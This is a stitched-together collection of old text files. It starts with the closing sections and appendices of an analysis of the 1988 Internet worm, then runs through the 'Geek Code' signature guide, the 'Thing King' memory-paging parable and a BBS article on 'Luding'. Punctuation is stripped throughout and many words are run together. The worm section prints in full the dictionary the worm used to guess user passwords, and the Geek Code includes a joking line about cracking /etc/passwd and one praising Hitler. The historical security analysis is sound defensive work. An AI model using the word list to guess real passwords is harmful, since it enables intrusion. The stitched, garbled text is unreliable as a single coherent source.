these conclusions are correct. The  presence of so much dead and duplicated code coupled with the  size of some data structures   such as the 20 slot object code  array   argues that the program was intended to be more  comprehensive.   7. Conclusions   It is clear from the code that the worm was deliberately designed  to do two things  infect as many machines as possible, and be  difficult to track and stop. There can be no question that this  was in any way an accident, although its release may have been  premature. It is still unknown if this worm, or a future version  of it, was to accomplish any other tasks. Although an author has  been alleged   Robert T. Morris  , he has not publicly confessed  nor has the matter been definitively proven. Considering the  probability of both civil and criminal legal actions, a  confession and an explanation are unlikely to be forthcoming any  time soon. Speculation has centered on motivations as diverse as  revenge, pure intellectual curiosity, and a desire to impress  someone. This must remain speculation for the time being,  however, since we do not have access to a definitive statement   From the author  s  . At the least, there must be some question  about the psychological makeup of someone who would build and run  such software.  18  Many people have stated that the authors of this code  19  must have been ``computer geniuses'' of some sort. I have been  bothered by that supposition since first hearing it, and after  having examined the code in some depth, I am convinced that this  program is not evidence to support any such claim. The code was  apparently unfinished and done by someone clever but not  particularly gifted, at least in the way we usually associate  with talented programmers and designers. There were many bugs and  mistakes in the code that would not be made by a careful,  competent programmer. The code does not evidence clear  understanding of good data structuring, algorithms, or even of  security flaws in UNIX. It does contain clever exploitations of  two specific flaws in system utilities, but that is hardly  evidence of genius. In general, the code is not that impressive,  and its ``success'' was probably due to a large amount of luck  rather than any programming skill possessed by the author. Chance  favored most of us, however. The effects of this worm were    largely   benign, and it was easily stopped. Had the code been  tested and developed further by someone more experienced, or had  it been coupled with something destructive, the toll would have  been considerably higher. I can easily think of several dozen  people who could have written this program, and not only done it  with far fewer   if any   errors, but made it considerably more  virulent. Thankfully, those individuals are all responsible,  dedicated professionals who would not consider such an act. What  we learn from this about securing our systems will help determine  if this is the only such incident we ever need to analyze. This  attack should also point out that we need a better mechanism in  place to coordinate information about security flaws and attacks.  The response to this incident was largely ad hoc, and resulted in  both duplication of effort and a failure to disseminate valuable  information to sites that needed it. Many site administrators  discovered the problem from reading the newspaper or watching the  television. The major sources of information for many of the  sites affected seems to have been Usenet news groups and a  mailing list I put together when the worm was first discovered.  Although useful, these methods did not ensure timely, widespread  dissemination of useful information  320 especially since they  depended on the Internet to work! Over three weeks after this  incident some sites are still not reconnected to the Internet.   This is the second time in six months that a major panic has hit  the Internet community.The first occurred in May when a rumor  swept the community that a ``logic bomb'' had been planted in Sun  software by a disgruntled employee. Many, many sites turned their  system clocks back or they shut off their systems to prevent  damage. The personnel at Sun Microsystems responded to this in an  admirable fashion, conducting in house testing to isolate any  such threat, and issuing information to the community about how  to deal with the situation. Unfortunately, almost everyone else  seems to have watched events unfold, glad that they were not the  ones who had to deal with the situation. The worm has shown us  that we are all affected by events in our shared environment, and  we need to develop better information methods outside the network  before the next crisis. This whole episode should cause us to  think about the ethics and laws concerning access to computers.  The technology we use has developed so quickly it is not always  simple to determine where the proper boundaries of moral action  may be. Many senior computer professionals started their careers  years ago by breaking into computer systems at their colleges and  places of employment to demonstrate their expertise. However,  times have changed and mastery of computer science and computer  engineering now involves a great deal more than can be shown by  using intimate knowledge of the flaws in a particular operating  system. Entire businesses are now dependent, wisely or not, on  computer systems. People's money, careers, and possibly even  their lives may be dependent on the undisturbed functioning of  computers. As a society, we cannot afford the consequences of  condoning or encouraging behavior that threatens or damages  computer systems. As professionals, computer scientists and  computer engineers cannot afford to tolerate the romanticization  of computer vandals and computer criminals. This incident should  also prompt some discussion about distribution of security  related information. In particular, since hundreds of sites have  ``captured'' the binary form of the worm, and since personnel at  those sites have utilities and knowledge that enables them to  reverse engineer the worm code, we should ask how long we expect  it to be beneficial to keep the code unpublished  As I mentioned  in the introduction, at least five independent groups have  produced reverse engineered versions of the worm, and I expect  many more have been done or will be attempted, especially if the  current versions are kept private. Even if none of these versions  is published in any formal way, hundreds of individuals will have  had access to a copy before the end of the year. Historically,  trying to ensure security of software through secrecy has proven  to be ineffective in the long term. It is vital that we educate  system administrators and make bug fixes available to them in  some way that does not compromise their security. Methods that  prevent the dissemination of information appear to be completely  contrary to that goal. Last, it is important to note that the  nature of both the Internet and UNIX helped to defeat the worm as  well as spread it. The immediacy of communication, the ability to  copy source and binary files from machine to machine, and the  widespread availability of both source and expertise allowed  personnel throughout the country to work together to solve the  infection even despite the widespread disconnection of parts of  the network. Although the immediate reaction of some people might  be to restrict communication or promote a diversity of  incompatible software options to prevent a recurrence of a worm,  that would be entirely the wrong reaction. Increasing the  obstacles to open communication or decreasing the number of  people with access to in depth information will not prevent a  determined attacker 320it will only decrease the pool of  expertise and resources available to fight such an attack.  Further, such an attitude would be contrary to the whole purpose  of having an open, research oriented network. The Worm was caused  by a breakdown of ethics as well as lapses in security 320a  purely technological attempt at prevention will not address the  full problem, and may just cause new difficulties.   Acknowledgments   Much of this analysis was performed on reverse engineered  versions of the worm code. The following people were involved in  the production of those versions  Donald J. Becker of Harris  Corporation, Keith Bostic of Berkeley, Donn Seeley of the  University of Utah, Chris Torek of the University of Maryland,  Dave Pare of FX Development, and the team at MIT  Mark W. Eichin,  Stanley R. Zanarotti, Bill Sommerfeld, Ted Y. Ts'o, Jon Rochlis,  Ken Raeburn, Hal Birkeland and John T. Kohl. A disassembled  version of the worm code was provided at Purdue by staff of the  Purdue University Computing Center, Rich Kulawiec in particular.

Appendix A The Dictionary   What follows is the mini dictionary of words contained in the  worm. These were tried when attempting to break user passwords.  Looking through this list is, in some sense revealing, but  actually raises a significant question  how was this list chosen   The assumption has been expressed by many people that this list  represents words commonly used as passwords  this seems unlikely.  Common choices for passwords usually include fantasy characters,  but this list contains none of the likely choices   e.g.,  ``hobbit,'' ``dwarf,'' ``gandalf,'' ``skywalker,'' ``conan''  .  Names of relatives and friends are often used, and we see women's  names like ``jessica,'' ``caroline,'' and ``edwina,'' but no  instance of the common names ``jennifer'' or ``kathy.'' Further,  there are almost no men's names such as ``thomas'' or either of  ``stephen'' or ``steven''   or ``eugene''!  . Additionally, none  of these have the initial letters capitalized, although that is  often how they are used in passwords. Also of interest, there are  no obscene words in this dictionary, yet many reports of  concerted password cracking experiments have revealed that there  are a significant number of users who use such words   or  phrases   as passwords. The list contains at least one incorrect  spelling  ``commrades'' instead of ``comrades''  I also believe  that ``markus'' is a misspelling of ``marcus.'' Some of the words  do not appear in standard dictionaries and are non English names   ``jixian,'' ``vasant,'' ``puneet,'' etc. There are also some  unusual words in this list that I would not expect to be  considered common  ``anthropogenic,'' ``imbroglio,'' ``umesh,''  ``rochester,'' ``fungible,'' ``cerulean,'' etc. I imagine that  this list was derived from some data gathering with a limited set  of passwords, probably in some known   to the author   computing  environment. That is, some dictionary based or brute force attack  was used to crack a selection of a few hundred passwords taken   From a small set of machines. Other approaches to gathering  passwords could also have been used 320Ethernet monitors, Trojan  Horse login programs, etc. However they may have been cracked,  the ones that were broken would then have been added to this  dictionary. Interestingly enough, many of these words are not in  the standard on line dictionary   in  usr dict words  . As such,  these words are useful as a supplement to the main dictionary  based attack the worm used as strategy  4, but I would suspect  them to be of limited use before that time. This unusual  composition might be useful in the determination of the  author  s   of this code. One approach would be to find a system  with a user or local dictionary containing these words. Another  would be to find some system  s   where a significant quantity of  passwords could be broken with this list. aaa academia aerobics  airplane albany albatross albert alex alexander algebra aliases  alphabet ama amorphous analog anchor andromache animals answer  anthropogenic anvils anything aria ariadne arrow arthur athena  atmosphere aztecs azure bacchus bailey banana bananas bandit  banks barber baritone bass bassoon batman beater beauty beethoven  beloved benz beowulf berkeley berliner beryl beverly bicameral  bob brenda brian bridget broadway bumbling burgess campanile  cantor cardinal carmen carolina caroline cascades castle cat  cayuga celtics cerulean change charles charming charon chester  cigar classic clusters coffee coke collins commrades computer  condo cookie cooper cornelius couscous creation creosote cretin  daemon dancer daniel danny dave december defoe deluge desperate  develop dieter digital discovery disney dog drought duncan eager  easier edges edinburgh edwin edwina egghead eiderdown eileen  einstein elephant elizabeth ellenemeraldengine engineer  enterprise enzyme ersatz establish estate euclid evelyn extension  fairway felicia fender fermat fidelity finite fishers flakes  float flower flowers foolproof football foresight format forsythe  fourier fred friend frighten fun fungible gabriel gardner  garfield gauss george gertrude ginger glacier gnu golfer gorgeous  gorges gosling gouge graham gryphon guestguitargumption guntis  hacker hamlet handily happening harmony harold harvey hebrides  heinlein hello help herbert hiawatha hibernia honey horse horus  hutchins imbroglio imperial include ingres inna innocuous  irishman isis japan jessica jester jixian johnny joseph joshua  judith juggle julia kathleen kermit kernel kirkland knight ladle  lambda lamination larkin larry lazaruslebesguelee leland leroy  lewis light lisa louis lynne macintosh mack maggot magic malcolm  mark markus marty marvin master maurice mellon merlin mets  michael michelle mike minimum minsky moguls moose morley mozart  nancy napoleon nepenthe ness network newton next noxious  nutrition nyquist oceanography ocelot olivetti olivia oracle orca  orwell osirisoutlawoxford pacific painless pakistan pam papers  password patricia penguin peoria percolate persimmon persona pete  peter philip phoenix pierre pizza plover plymouth polynomial  pondering pork poster praise precious prelude prince princeton  protect protozoa pumpkin puneet puppet rabbit rachmaninoff  rainbow raindrop raleigh random rascal really rebecca remote rick  ripple robotics rochesterrolexromano ronald rosebud rosemary  roses ruben rules ruth sal saxon scamper scheme scott scotty  secret sensor serenity sharks sharon sheffield sheldon shiva  shivers shuttle signature simon simple singer single smile smiles  smooch smother snatch snoopy soap socrates sossina sparrows spit  spring springer squires strangle stratford stuttgart subway  success summer supersuperstage support supported surfer suzanne  swearer symmetry tangerine tape target tarragon taylor telephone  temptation thailand tiger toggle tomato topography tortoise  toyota trails trivial trombone tubas tuttle umesh unhappy unicorn  unknown urchin utility vasant vertigo vicky village virginia  warren water weenie whatnot whiting whitney will william  williamsburg willie winston wisconsinwizardwombat woodwind  wormwood yacov yang yellowstone yosemite zap zimmerman            Appendix B The Vector Program  The worm was brought over to each machine it infected via the  actions of a small program I call the vector program. Other  individuals have been referring to this as the grappling hook  program. Some people have referred to it as the program, since  that is the suffix used on each copy. The source for this program  would be transferred to the victim machine using one of the  methods discussed in the paper. It would then be compiled and  invoked on the victim machine with three command line arguments   the canonical IP address of the infecting machine, the number of  the TCP port to connect to on that machine to get copies of the  main worm files, and a magic number that effectively acted as a  one time challenge password. If the ``server'' worm on the remote  host and port did not receive the same magic number back before  starting the transfer, it would immedi  ately disconnect from the  vector program. This can only have been to prevent some  one from  attempting to ``capture'' the binary files by spoofing a worm  ``server.'' This code also goes to some effort to hide itself,  both by zeroing out the argu  ment vector, and by immediately  forking a copy of itself. If a failure occurred in transferring a  file, the code deleted all files it had already transferred, then  it exited. One other key item to note in this code is that the  vector was designed to be able to transfer up to 20 files  it was  used with only three. This can only make one wonder if a more  extensive version of the worm was planned for a later date, and  if that version might have carried with it other command files,  password data, or possibly local virus or trojan horse programs.     what follows is a pair of programs that I was unable to decode  with any dependability    References   BSD is an acronym for Berkeley Software Distribution.  UNIX is a registered trademark of AT T Laboratories.  VAX is a trademark of Digital Equipment Corporation.   The second edition of the book, just published, has been  ``updated'' to omit this subplot about  VIRUS.       Page  4 5  5   It is probably a coincidence that the Internet Worm was loosed on  November 2, the eve of this ``birthday.''   6   Note that a widely used alternative to sendmail, MMDF, is also  viewed as too complex and large by  many users. Further, it is  not perceived to be as flexible as sendmail if it is necessary  to establish special  addressing and handling rules when bridging  heterogeneous networks.   7   Strictly speaking, the password is not encrypted. A block of zero  bits is repeatedly encrypted using  the user password, and the  results of this encryption is what is saved. See  Morr79  for  more details.   8   Such a list would likely include all words in the dictionary, the  reverse of all such words, and a large  collection of proper  names.   8   rexec is a remote command execution service. It requires that a  username password combination be  supplied as part of the  request.   9   This was compiled in as port number 23357, on host 127.0.0.1   loopback  .   10   Using TCP port 11357 on host 128.32.137.13.   11   Interestingly, although the program was coded to get the address  of the host on the remote end of  point to point links, no use  seems to have been made of that information.   12  As if some of them aren't suspicious enough!  13  This appears to be a bug. The probable assumption was that the  routine hl would handle infection of local hosts, but hl calls  this routine! Thus, local hosts were never infected via this  route.  14  This is puzzling. The appropriate file to scan for equivalent  hosts would have been the .rhosts file, not the .forward file.  15  Private communication from someone present at the meeting.  16  The thought of a Sequent Symmetry or Gould NP1 infected with  multiple copies of the worm presents an awesome   and awful    thought. The effects noticed locally when the worm broke into a  mostly unloaded VAX 8800 were spectacular. The effects on a  machine with one or two orders of magnitude more capacity is a  frightening thought.  17  Developed by Kevin Braunsdorf and Rich Kulawiec at Purdue PUCC.  18  Rick Adams, of the Center for Seismic Studies, has commented that  we may someday hear that the worm was loosed to impress Jodie  Foster. Without further information, this is as valid a  speculation as any other, and should raise further disturbing  questions  not everyone with access to computers is rational and  sane, and future attacks may reflect this.  19  Throughout this paper I have been writing author  s   instead of  author. It occurs to me that most of the mail, Usenet postings,  and media coverage of this incident have assumed that it was  author   singular  . Are we so unaccustomed to working together  on programs that this is our natural inclination  Or is it that  we find it hard to believe that more than one individual could  have such poor judgement  I also noted that most of people I  spoke with seemed to assume that the worm author was male. I  leave it to others to speculate on the value, if any, of these  observations.   "

No matter what anyone says, geeks are people too  geeks have rights.  So take a deep breath and announce to the world that you are a geek.  Your courage will give you strength that will last you forever.  How to tell the world you are a geek, you ask   Use the universal Geek code.  By joining the geek organization, you have license to use this special code that will allow you to let other un closeted geeks know who you are in a simple, codified statement.  The single best way to announce your geekhood is to add your geek code to signature file and announce it far and wide.  But be careful, you may give other geeks the courage to come out of the closet.  You might want to hang on to your copy of the code in order to help them along.                        INSTRUCTIONS   The geek code consists of several categories.  Each category is labeled with a letter and some qualifiers.  Go through each category and determine which set of qualifiers best describes you in that category.  By stringing all of these 'codes' together, you are able to construct your overall geek code.  It is this single line of code that will inform other geeks the world over of what a great geek you actually are.  Some of the qualifiers will very probably not match with you exactly.  Simply choose that qualifier that MOST CLOSELY matches you.  Also, some activities described in a specific qualifier you may not engage in, while you do engage in others.  Each description of each qualifier describes the wide range of activities that apply, so as long as you match with one, you can probably use that qualifier.                          VARIABLES  Geeks can seldom be quantified.  To facilitate the fact that within any one category the geek may not be able determine a specific category, variables have been designed to allow this range to be included.                  for variable, said trait is not very rigid, may change with                  time or with individual interaction.  For example, Geeks                 who happen to very much enjoy Star Trek   The Next Generation,                 but dislike the old 60's series might list themselves as                 t   .                 for indicating  cross overs  or ranges.  Geeks who go from                  c  to c    depending on the situation  i.e. mostly  c    could                  use c      .  Another example might be an m     .  This                 would be a person who mostly listens to classical music, but                 also has an extensive collection of other types of works.            is different from    in that    has finite limits within the         category, while   ranges all over.                           Type  Geeks come in many flavors.  The flavors relate to the vocation of the particular geek.  To start a code, a geek must declare himself or herself to be a geek.  To do this, we start the code with a  G  to denote  GEEK , followed by one or two letters to denote the geeks occupation or field of study.  Multi talented geeks with more than one vocation should denote their  myriad of talents with a slash between each vocation  example   GCS MU T .          GB          Geek of Business         GCS         Geek of Computer Science         GE          Geek of Engineering         GM          Geek of Math         GMU         Geek of Music         GS          Geek of Science  Physics, Chemistry, Biology, etc.          GSS         Geek of Social Science  Psychology, Sociology, etc.          GT          Geek of Theater          GO          Geek of Other.  Some types of geeks deviate from the                     normal geek activities.  This is encouraged as true geeks                      come from all walks of life.         GU          Geek of 'Undecided'.  This is a popular vocation with                     new freshmen.          GAT         Geek of All Trades.  For those geeks that can do                     anything and everything.  GAT usually precludes the use                     of other vocational descriptors.                          Dress  Geeks come in many different types of dress.          d       I dress a lot like those in Walmart ads         d       I tend to wear trendy political messages like  Save the                 Whales  or  Free South Africa .         d       I tend to wear conservative dress such as a business                 suit.         d       I tend to wear trendy political messages like  Nuke the                 Humans ,  Question Authority , or  Big Brother's Watching .         d       I wear jeans to work just to piss off my boss         d       At work, I have holes in my jeans and or obscenities on                 my shirt.          d       I have no idea what I am wearing right now, let alone                 what I wore yesterday.         !d      No clothing.  Quite a fashion statement, don't you think           d      I wear the same clothes all the time, no matter the                 occasion, often forgetting to do laundry between wearings.                         Politics  Just as the Geek's sense of fashion is varied, so is his her political convictions.          p       Politics   I've heard of that somewhere but in all honesty                 I really don't give a shit.         p       Let's get the government off of big business's back         p       All in favor of eliminating free speech, say aye!         p       Fuckin' Minorities!  Adolf Hitler is my hero!         p       Bring back the 60's         p       I'm still living in the 60's         p       No taxes through no government                   p      Don't label me you moron!  Both sides are equally fucked up!                         Computers  Most geeks identify themselves by their use of computers and computer networks.  In order to quantify your geekiness level on computers, consult the following  consider the term 'computers' synonymous with 'computer network'            c       Computers are a tool, nothing more.  I use it when it serves                 my purpose.         c       Computers are fun and I enjoy using them.  I play a mean                 game of Wing Commander and can use a word processor without                  resorting to the manual too often.  I know that a 3.5  disk                  is not a hard disk.  I also know that when it says 'press any                  key to continue', I don't have to look for a key labeled  'ANY'.         c       Computers are a large part of my existence.  When I get up                 in the morning, the first thing I do is log myself in.  I mud                 on weekends, but still manage to stay off of academic                  probation.         c       You mean there is life outside of Internet   You're shittin'                 me!  I live for muds.  I haven't dragged myself to class in                 weeks.         c       I'll be first in line to get the new cybernetic interface                  installed into my skull.                 c       Anything more complicated than my calculator and I'm                 screwed.         c       Where's the on switch          c       If you even mention computers, I will rip your head off!                       Linux  Linux is a hacker written operating system virtually identical to unix.  It runs on your standard 386 486 PC computers and offers multitasking support far superior to DOS.  Because it is still a young OS, and because it is continually evolving from hacker changes and support, it is important that the geek list his Linux ability.          l       I know what Linux is, but that's about all         l       I've managed to get Linux installed and even used it a few                 times.  It seems like it is just another OS.         l       I use Linux almost exclusively on my system.  I monitor                 comp.os.linux and even answer questions some times.  I've                  aliased Linux FTP sites to make getting new software easier.         l       I am a Linux wizard.  I munch C code for breakfast and have                  enough room left over for a kernel debugging.  I have so                 many patches installed that I lost track about ten versions                 ago.  Linux newbies consider me a net.god.         l       I have no desire to use Linux and frankly don't give a rats                 ass about it.         l       Unix sucks.  Because Linux   Unix.  Linux Sucks.  I worship                 Bill Gates.          !l      I don't even use an 80x86 chip, so linux isn't really a                 reality for me.  ie, Mac people .         l       What the hell is Linux   I've never even heard of it.                       Unix  Just as geeks sometimes use Linux, a great many geeks also use generic Unix machines to accomplish their geeky ends.                    u       I have a unix account to do my stuff in         u       I not only have a unix account, but I slam VMS any chance I                 get.         u       I've get the entire admin ticked off at me because I am                 always using all of the CPU time and trying to run programs                  that I don't have access to.  I'm going to try cracking                  etc passwd next week, just don't tell anyone.         u       I have a VMS account.          u       I've seen unix and didn't like it.  DEC rules!         u       Unix geeks are actually nerds in disguise.                       Education  All geeks have a varying amount of education.          e       K 12, been on a college campus.          e       Started a B.S. B.A, plan to finish it some day.          e       Had not learned enough to know better not to go back and try                 for a master's degree.          e       Still pretty stupid, over qualified to work any job, went and                 got my Ph.D.          e       Got my bachelors, escaped alive, and am making hoards of money                 writing unmaintainable  except by me  software.          e       The company I work for was dumb enough to fund my way through                 a masters degree, then started paying me even more money.          e       Achieved a Ph.D, have devoted my life to insignificant  research,                 which my employer pays dearly for.           e       I learned everything there is to know about life from the                  Hitchhiker's Trilogy .                        Music  Musical interests vary widely, also.          m       I occasionally listen to the radio         m       I own a tape or CD collection  records also count, but you                 would be admitting how old you really are .         m       I consider myself refined and enjoy classical and new age                 selections         m       I consider myself over refined and grok that heavy duty                 elevator music.         m       Just play it loud         m       I play air guitar better than anyone else.         m       LISTEN!  I SAID TO PLAY IT LOUD!                  m       I am an expert on so many types of music that I can't even                 keep them straight                       Shape  Geeks come in many shapes and sizes.  Shape code is divided into two parts. The first indicates height, while the second indicates roundness.  Mix each section to fit yourself.  Examples include   s   , s   , s     .          s       I'm an average geek         s       I'm a little taller rounder than most.         s       I'm a basketball linebacker candidate.         s       I usually have to duck through doors I take up three movie                  seats.         s       I look up to most people.  Everyone tells me to gain a                  few pounds.         s       I look up to damn near everybody.  I tend to have to fight                 against a strong breeze.          s       I take a phone book with me when I go out so I can see to                 eat dinner.  My bones are poking through my skin.                       Nutrition  Geeks usually consume food. Some eat everything they can grab while some others are quite conscious of their food.   Note   'n' is used for nutrition as 'f' is used elsewhere.           !n      Eh what  never mind the menu, give me something to eat!          n       I like food   especially when it is healthy.          n       I like the fibers in food         n       Food  I just grab something from the shelves with meat in it.          n       I eat only the cheap things   even with artificial meat and                 vegetables.         n       I _live_ on snacks and coke.                        Housing               h       Friends come over to visit every once in a while to talk                 about Geek things.  There is a place for them to sit.          h       Living alone, get out once a week to buy food, no more than                 once a month to do laundry.  All surfaces covered.          h       Living in a cave with 47 computers and an Internet feed,                  located near a Dominoes pizza.  See !d.          h       Living with one or more registered Geeks.         h       Living with one or more people who know nothing about being a                 Geek and refuse to watch 'Star Trek'.          h       Married, with the potential for children.  persons living                 with a fiance might as well label themselves h   , you're as                 good as there already.           h       I'm not sure where I live anymore.  This lab workplace seems                     like home to me.                       Friends   Yes, it's true  geeks do have friends.  At least, some of them do.           f       Yeah, I have friends.  Who told you           f       I have quite a few really close friends.  We get along great.                  They are all other geeks, though.         f       I have so many friends, I make other people jealous.          f       I have a few friends.  They barely seem to speak to me  anymore.          f       I've got about one friend left in the world, who probably                 wants to shoot me.           f       I  think  I have friends.          f       Everyone is my friend.          !f      I have no friends.  Get lost.                         Glasses  Geeks have traditionally worn glasses.           !g      I have no glasses         g       I've got four eyes, what's your point          g       I've got four eyes and tape in the middle         g       I have coke bottle classes that I can use to start leaves on                 fire in the hot sun.         g       I have contacts         g       I have colored contacts          g       I have those funky contact that have interesting designs on                 them such as happy faces or some such.                        Weirdness  Geeks have a seemingly natural knack for being  weird .  Of course, this is a subjective term as one person's weirdness is another person's normalness.  As a general rule, the following weird qualifiers allow a geek to rate their weirdness.                   w       I am not weird.  I'm perfectly normal.         w       so   what's your problem with weird.         w       I am so weird, I make Al Yankovic look sane.         w       Mainstream   I heard of that once, I think.         w       I'm more normal that most people normally are.         w       Isn't everyone in the p  group                                   Star Trek  Most geeks have an undeniable love for the Star Trek television  in any of its three forms .  Because GEEK is often synonymous with TREKKIE, it is important that all geeks list their Trek rating.          t       It's just another TV show         t       It's a damn fine TV show and is one of the only things                 good on television any more.          t       It's the best show around.  I have all the episodes and the                 movies on tape and can quote entire scenes verbatim.  I've                  built a few of the model kits too.  But you'll never catch me                 at one of those conventions.  Those people are kooks.         t       It's not just a TV show, its a religion.  I know all about                 warp field dynamics and the principles behind the                  transporter.  I have memorized the TECH manual.  I speak                  Klingon.  I go to cons with Vulcan ears on.  I have no life.         t       Maybe it is just me, but I have no idea what the big deal                 with Star Trek is.  Perhaps I'm missing something but I just                 think it is bad drama.         t       Star Trek is just another Space Opera.  William Shatner isn't                 an actor, he's a poser!  And what's with this Jean Luc Picard                   A Frenchman with a British accent   Come on.  I'd only watch                  this show if my remote control broke.            t       Star Trek SUCKS!  It is the worst crap I have ever seen!                  Hey, all you trekkies out there, GET A LIFE!   William                 Shatner is a t                            Role Playing  Role playing games such as Dungeons   Dragons have long been a part of the traditional geek life.  Because geeks often become so involved in their role playing that they lose touch with reality, include one of the following role playing codes.          r       Role Playing   That's just something to do to kill a                  Saturday afternoon         r       I've got my weekly sessions set up and a character that I                 know better than I know myself.         r       There is no life outside the role of the die.  I know all of                 piddly rules of  chosen game .  _MY_ own warped rules scare                  the rest of the players.           r       I worship E. Gary Gygax.         r       Gosh, what an utter waste of time!         r       Role Players worship SATAN!                        Sex  Geeks have traditionally had problems with sex  ie, they never have any . Because geeks are so wrapped up in their sexuality  or lack of sexuality for that matter , it is important that the geek be willing to quantify their sexual experiences.  This code also is used to denote the gender of the geek.  Females use 'x' in this category, while males use 'y'.  For example          x       A female who has had sex         y       A male who has had sex.  For those person who do not wish to give out any details of their sex life, the use of x   where x is the gender code  will allow you to so.          !x      Sex   What's that   I've had no sexual experiences.         x       I've had real, live sex.          x       I was once referred to as 'easy'.  I have no idea where that                 might have come from though.         x       I prefer computer sex to real sex.           x       I was once referred to as a 'cyberslut', but I have no idea                 where that might have come from.          x       I'm a pervert.         x       I've been known to make perverts look like angels.          x       It's none of your business what my sex life is like  this                 is used to denote your gender only .

Things in the same crate are called crate mates.  3.   Crates are stored either in the workshop or the warehouse.      The workshop is almost always too small to hold all      the crates.  4.   There is only one workshop but there may be several      warehouses.  Everybody shares them.  5.   Each thing has its own thing number.  6.   What you do with a thing is to zark it.  Everybody      takes turns zarking.  7.   You can only zark your things, not anybody else's.  8.   Things can only be zarked when they are in the      workshop.  9.   Only the Thing King knows whether a thing is in the      workshop or in a warehouse.  10.  The longer a thing goes without being zarked, the      grubbier it is said to become.  11.  The way you get things is to ask the Thing King.      He only gives out things in multiples of eight.      This is to keep the royal overhead down.  12.  The way you zark a thing is to give its thing      number.  If you give the number of a thing that happens      to be in a workshop it gets zarked right away.  If it      is in a warehouse, the Thing King packs the crate      containing your thing back into the workshop.  If there      is no room in the workshop, he first finds the grubbiest      crate in the workshop, whether it be yours or somebody      else's, and packs it off with all its crate mates to a      warehouse.  In its place he puts the crate containing      your thing.  Your thing then gets zarked and you never      know that it wasn't in the workshop all along.  13.  Each player's stock of things have the same numbers as      everybody else's.  The Thing King always knows who owns      what thing and whose turn it is, so you can't ever      accidentally zark somebody else's thing even if it has the      same thing number as one of yours.                          NOTES  1.   Traditionally, the Thing King sits at a large, segmented      table and is attended to by pages  the so called  table      pages   whose job it is to help the king remember where      all the things are and who they belong to.  2.   One consequence of Rule 13 is that everybody's thing      numbers will be similar from game to game, regardless      of the number of players.  3.   The Thing King has a few things of his own, some of      which move back and forth between workshop and warehouse      just like anybody else's, but some of which are just      too heavy to move out of the workshop.  4.   With the given set of rules, oft zarked things tend to      get kept mostly in the workshop while little zarked      things stay mostly in a warehouse.  This is efficient      stock control.  5.   Sometimes even warehouses get full.  The Thing King      then has to start piling things on the dump out back.      This makes the game slower because it takes a long time      to get things off the dump when they are needed in the      workshop.  A forthcoming change in the rules will allow      the Thing King to select the grubbiest things in the      warehouses and send them to the dump in his spare time,      thus keeping the warehouses from getting too full.      This means that the most infrequently zarked things will      end up in the dump so the Thing King won't have to get      things from the dump so often.  This should speed up      the game when there are a lot of players and the warehouses      are getting full.                  LONG LIVE THE THING KING  "

To succesfully Lude, or fly in air, one may have help from his her fellow Ludist.  In the circular Lude, the members of the   Ludist Colony,  try to help the fellow Ludist stay in air by a series of pushes in an upward and circular direction.  The ultimate object is to complq4 as many   Ludians   or revolutions as possible.  The record so far is 1.2 DecaLudians, held by one, Riff Raff, of the   Ludist Colony Elite      `  The Ludist Colony Elite is the original Ludist Colony, they are the ones who put the research into the actual sport.  They checked out several Ludatoriums in the Twin Cities area in the winter of 1984 85.    Please DO NOT get this sport confused with flagpole rope swinging, Luding is much more than that!  Just read on!                                                                                                      Intermediate Luding                                              By Sinbad Sailor!              M C M L X X X V !                                                                 Once a  Ludatorium  is found and some begining Luding has been accomplished, you should start thinkin of new ways to Lude.  For one thing a proper grip upon the Lude rope is essential!  We, the Ludist Colony Elite prefer the   Official Air Force Grip.  That is, one hand through the rope, taking hold of the main ropes, forming a loop, and then placing one hand above that, and make sure that you have a tight grip.    Once a firm grip is made, then the Ludist is set, we also prefer gloves in the winter.  Then the Ludist may circular lude, with help from his her fellow ludists.    After awhile this circular Luding gets to be quite fun and enjoyable, and one can see that yit can be fun for Dh whole family.  But when the Colony begins to get sick of this, there are other forms of Luding.    One other form is the famed   Linear Lude Lash.  Which is where the Ludist takes hold of the Lude rope, with the   Official Air Force Grip  , and runs in a straight line, thus the term 'linear', and tries to lash forward.  Hieght is the main idea behind this one. As of right now the record for that max hieght for Linear Lude Lashing is held by The Latin Appler, unfortunately, we do not have an exact measurement on this because it would be rather cumbersome to calculate the max hieght while the Ludist is in flight, so we prefer to 'eyeball' it.  For more Luding, read on...                                                                                                    Advanced Luding!                                            By Sinbad Sailor              M C M L X X X V!                                                                  As an advanced Luder, one who has succesfully done several decaludians and several Linear Lude Lashes, the Luder and his her colony should also be considering doing some other things.    One thing is to appoint a   Official Lude Ref.  One who keeps official track of important things, such as the available Ludatoriums in the area, keeping track of members of the colony, counting revolutions, and ' eyeballing ' the Luders' Lude Lashing.    Other research that has come up from the Colony Elite.  There are a myriad of ways to Lude, some others are the famed  Inverted Linear Lude Lash.     This concept was first preformed by Biko Mack.  It was quite an incredible sight to see, it is the standard Linear Lude Lash AND inverting oneself while in flight!  The main reason why this was so incredible was because it was Biko's first time to ever Lude!    Another form of Luding is the Semi Nude Lude, which is when a Luder from the colony ludes with no shirt on.   WARNING   When this stunt is preformed in the winter seasons, we would only attempt this type of Luding by an expert or advanced Luder, and if preformed, do the Linear Lude Lash, for it is much quicker and less unpleasant!    If the Semi Nude Lude is attempted by an begining Ludist, we fear that there r _ may be action to be taken to aviod  pin biffs.  This is when the Luder hits the Lude pole on the way down from a Linear Lude Lash.  Pin from the way the pole looks like a pin, and biff, from the old Batman televsion series, when something is struck by something or someone else the word BIFF would appear on the screen, thus  pin biff.     Another hazard of Luding is the gravel grind, this first never really happend to us at the Ludist Colony Elite because of the positioning of the Lude rope, but when we went to another Ludatorium, one at a golf course, where there happens to be gravel on the ground and the position of the Lude rope is low, thus the Luder grinded into the ground into gravel, thus   the gravel grind.     More research continues...  and not just by the Ludist Colony Elite. We want YOU to research too, and input information into this BBS and others that support Luding to make this a success across the ENTIRE nation, a pastime, xhobby, and maybe even an official olympic sport...  the limit is the sky...                                           Uploaded By  FENRIS ULF           LUDING Items needed     Luding pole Not to be less the twenty feet high or have a diameter of less        than four inches.    Luding rope It must be a loop of rope connected to the top of the luding pole        with a thickness of not less than one quarter of an inch.    Luding gloves  These are most commonly selected by the individual luder they    are generally made out of leather but other materials are    accepted.  The flyer mus t were them at all times.    Luding padding  Padding is purely optional, but is strongly recommended to     the new luder especially if he is linear luding.  The padding     will protect him from the dreaded pin biff.  The Game     Luding, like any other sport, needs a field that the action can take place on.  This field is called the Luditorium.  It consists of one large Lude pole with a rope connected to the top  we have found through research that a flag po le works well .  It is very important that the immediate area around the pole be c lear of any ofstacles like rocks, poles, trees, etc.  A word of caution  most l uditoriums 